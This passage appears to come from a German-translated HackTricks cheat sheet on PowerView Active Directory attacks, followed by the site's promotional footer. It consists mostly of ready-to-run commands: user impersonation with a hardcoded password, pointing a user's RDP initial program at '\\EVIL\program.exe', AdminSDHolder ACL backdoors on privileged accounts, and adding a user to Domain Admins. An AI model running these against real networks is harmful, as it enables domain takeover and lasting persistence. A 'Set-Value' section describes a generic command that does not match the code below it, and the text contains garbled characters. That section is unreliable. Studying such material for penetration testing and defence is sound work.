Invoke-UserImpersonation -Username JohnDoe -Command whoami
```

This can be useful during a penetration test to test the permissions and access levels of different users within a network.
```powershell
# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf
```
#### Werte festlegen

```powershell
Set-Value -Name <Name> -Value <Wert>
```

Mit dem `Set-Value`-Befehl k√∂nnen Sie Werte f√ºr bestimmte Variablen festlegen. Verwenden Sie den Parameter `-Name`, um den Namen der Variable anzugeben, und den Parameter `-Value`, um den Wert festzulegen.
```powershell
# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
# Backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
# Add user to 'Domain Admins'
Add-NetGroupUser -Username username -GroupName 'Domain Admins' -Domain my.domain.local
```
<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder m√∂chten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family).
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com).
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>
